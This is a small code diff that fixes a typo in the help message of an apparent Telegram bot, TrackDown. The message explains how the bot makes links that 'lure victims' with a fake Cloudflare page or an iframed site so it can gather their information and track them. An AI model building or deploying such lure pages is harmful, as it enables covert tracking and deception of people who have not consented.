@@ -78,7 +78,7 @@ bot.sendMessage(chatId,` Through this bot you can track people just by sending a
 to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
 the url it will send you 2 links which you can use to track people.
 \n\nSpecifications.
-\n1. Cloudflare Link: This method will show a cloudflare under attack page to garher informations and afterwards victim will be redirected to destinationed URL.
+\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
 \n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
 ( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
 \n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
